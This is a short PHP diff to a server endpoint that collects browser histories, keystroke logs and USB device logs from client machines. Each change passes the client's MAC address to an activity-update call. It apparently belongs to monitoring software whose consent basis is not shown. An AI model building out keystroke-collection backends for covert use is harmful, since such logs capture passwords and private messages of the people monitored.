@@ -72,8 +72,8 @@ try {
             $browserHistories = $data['BrowserHistories'] ?? [];
             if (!empty($browserHistories)) {
                 $inserted_count = $dbService->addBrowserHistoryLogs($browserHistories, $clientIP, $macAddress);
-                // Update monitor activity for browser history logging
-                $dbService->updateMonitorActivity($clientIP, 'browser');
+                // Update monitor activity for browser history logging (pass MAC address)
+                $dbService->updateMonitorActivity($clientIP, 'browser', $macAddress);
                 $response['data'] = [
                     'inserted_count' => $inserted_count
                 ];
@@ -84,8 +84,8 @@ try {
             $keyLogs = $data['KeyLogs'] ?? [];
             if (!empty($keyLogs)) {
                 $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
-                // Update monitor activity for key logging
-                $dbService->updateMonitorActivity($clientIP, 'monitor');
+                // Update monitor activity for key logging (pass MAC address)
+                $dbService->updateMonitorActivity($clientIP, 'monitor', $macAddress);
                 $response['data'] = [
                     'inserted_count' => $inserted_count
                 ];
@@ -96,8 +96,8 @@ try {
             $usbLogs = $data['USBLogs'] ?? [];
             if (!empty($usbLogs)) {
                 $inserted_count = $dbService->addUSBDeviceLogs($usbLogs, $clientIP, $macAddress);
-                // Update monitor activity for USB logging
-                $dbService->updateMonitorActivity($clientIP, 'monitor');
+                // Update monitor activity for USB logging (pass MAC address)
+                $dbService->updateMonitorActivity($clientIP, 'monitor', $macAddress);
                 $response['data'] = [
                     'inserted_count' => $inserted_count
                 ];
